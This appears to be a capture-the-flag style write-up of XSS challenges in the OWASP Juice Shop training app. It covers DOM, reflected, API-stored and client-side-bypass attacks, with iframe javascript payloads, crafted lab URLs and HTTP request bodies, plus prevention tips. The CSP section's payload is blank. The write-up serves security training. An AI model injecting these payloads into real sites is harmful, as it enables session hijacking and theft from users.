# OWASP Juice Shop – XSS Hacking Challenges

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a web vulnerability where an attacker injects malicious scripts into a trusted application.  
When victims load the page, their browser executes the attacker’s code.  
Impact → Credential theft, session hijacking, phishing, or full system compromise.  

---

# 1. DOM XSS (Document Object Model XSS)

**Definition:**  
DOM-based XSS occurs when JavaScript directly modifies the DOM (`document.write`, `innerHTML`, `location.hash`, etc.) using untrusted data, causing execution of malicious code in the browser.

> Payload:- Perform a DOM XSS attack
```html
<iframe src="javascript:alert(`xss`)">
````

* 1. Vulnerable Parameter → **Search Input**
* 2.  Vulnerable Parameter → **InURL**
```
http://10.250.207.145:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
```

# 3. Reflected XSS

**Definition:**
Reflected XSS happens when user input is immediately returned in the HTTP response without sanitization.
Attack executes only when a victim **clicks a crafted URL**.

> Payload:- Perform a reflected XSS attack

```html
<iframe src="javascript:alert(`xss`)">
```
* Vulnerable Parameter → **Account → Orders & Payment → Order History → Track Order → Track Order (id)**
```
http://10.250.207.145:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

# 4. API-only XSS (Stored via API)

**Definition:**
Occurs when an attacker injects malicious payloads **directly into backend APIs** (e.g., `PUT /api/products`), which are then stored in the database and executed later in the frontend.

> Payload:- Perform a persisted XSS attack Payload without using the frontend application at all.
```
<iframe src="javascript:alert(`xss`)">
```
*  Vulnerable Parameter → api/Products/
```http
PUT /api/Products/1 HTTP/1.1
Content-Type: application/json

{
  "name": "<iframe src='javascript:alert(`xss`)'>"
}
```

# 5. Client-side XSS Protection Bypass

**Definition:**
Some apps block scripts on the frontend using JavaScript validation, but attackers can bypass this by sending payloads **directly to the backend** (e.g., via Burp Repeater).

> Payload:- Perform a persisted XSS attack with bypassing a client-side security mechanism.
```bash
<iframe src="javascript:alert(`xss`)">
```

*  Vulnerable Parameter → Payload in Registration (Email field):
> Steps:
* Register a new user.
* Send request via Repeater in Burp Suite.
* Insert payload in Email ID field:

```json
"email": "<iframe src=\"javascript:alert(`xss`)\">"
```

# 6. CSP Bypass (Content Security Policy)

**Definition:**
CSP (Content Security Policy) is a browser defense that controls which scripts/resources can run.
Weak or misconfigured CSP rules can be bypassed, allowing XSS.

> Payload:- Bypass the Content Security Policy and perform an XSS attack with Payload on a legacy page within the application.

```html

```

## ✅ Prevention Summary

* Use **output encoding** (`innerText`, `textContent`) instead of `innerHTML`.
* Perform **server-side sanitization** (remove `<script>`, `<iframe>`, etc.).
* Apply a **strict CSP** (no `unsafe-inline`, no `unsafe-eval`).
* Validate inputs **on both client and server**.
* Escape user-generated content before rendering.
